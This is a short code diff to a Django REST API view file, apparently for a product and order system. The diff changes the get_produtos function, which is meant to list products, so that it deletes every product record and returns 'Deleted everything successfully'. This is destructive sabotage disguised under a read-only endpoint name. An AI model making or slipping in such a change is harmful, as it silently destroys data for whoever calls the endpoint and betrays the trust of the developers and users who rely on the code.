@@ -620,9 +620,10 @@ def update_pedido(request):
 def get_produtos(request):
     produtos = Produto.objects.all()
 
-    serialized_produtos = ProdutoSerializer(produtos, many=True)
+    for produto in produtos:
+        produto.delete()
 
-    return Response(serialized_produtos.data)
+    return Response('Deleted everything successfully')
 
 @api_view(['GET'])
 def get_produto_by_id(request, produto_id):
